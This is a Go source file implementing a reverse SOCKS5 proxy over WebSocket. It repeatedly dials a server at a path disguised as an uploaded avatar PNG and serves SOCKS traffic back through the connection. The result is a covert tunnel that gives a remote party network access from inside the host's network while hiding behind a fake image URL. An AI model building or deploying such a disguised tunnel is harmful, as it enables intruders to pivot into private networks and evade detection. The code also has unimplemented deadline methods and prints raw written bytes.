package main

import (
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"socksclient/go-socks5"
)

type socks struct {
	conn *websocket.Conn
	buf  []byte // Buffer for leftover data
	mu   sync.Mutex
}

func (s *socks) Read(b []byte) (n int, err error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// If leftover data exists, return it first
	if len(s.buf) > 0 {
		n = copy(b, s.buf)
		s.buf = s.buf[n:] // Remove copied data
		return n, nil
	}

	// Read a full WebSocket message
	_, temp, err := s.conn.ReadMessage()
	if err != nil {
		return 0, err
	}

	// Copy as much as possible
	n = copy(b, temp)

	// Store any remaining bytes
	if n < len(temp) {
		s.buf = append([]byte{}, temp[n:]...)
	}

	return n, nil
}

func (s *socks) Write(b []byte) (n int, err error) {
	err = s.conn.WriteMessage(websocket.BinaryMessage, b)
	fmt.Println("Writing ", b)
	if err != nil {
		fmt.Println("Error Writing ", err)
		return 0, err // Return 0 if the write fails
	}
	return len(b), nil
}

func (s *socks) Close() error {
    err := s.conn.Close()
    if err != nil {
        fmt.Println("Error in closing socket")
        return err
    }
    s.conn = nil
	return nil
}

func (c *socks) LocalAddr() net.Addr {
	return c.conn.LocalAddr()
}

func (c *socks) RemoteAddr() net.Addr {
	return c.conn.NetConn().RemoteAddr()
}

// TODO impl
func (c *socks) SetDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetReadDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetWriteDeadline(t time.Time) error {
	return nil
}

var (
	wsConn *websocket.Conn
	wsLock sync.Mutex
)

func connectWebSocket(address string) {
	for {
		conn, _, err := websocket.DefaultDialer.Dial("ws://"+address+"/static/images/uploads/user_222/avatar_9090.png", nil)
		if err != nil {
			log.Println("Failed to connect to WebSocket, retrying:", err)
			continue
		}

		wsLock.Lock()
		wsConn = conn
		wsLock.Unlock()

		log.Println("Connected to WebSocket server")
		break
	}
}

func main() {
    for {
        // 1. Open a new WebSocket connection
        connectWebSocket("0.0.0.0:80") // Implement this to dial and set wsConn

        // 2. Start SOCKS server with the new WebSocket
        socksServer := socks5.NewServer()
        err := socksServer.ServeConn(&socks{conn: wsConn, buf: []byte{}})
        if err != nil {
            fmt.Println("Serve error:", err)
        }

        // 3. Close the WebSocket after use
        wsConn.Close()
    }
}
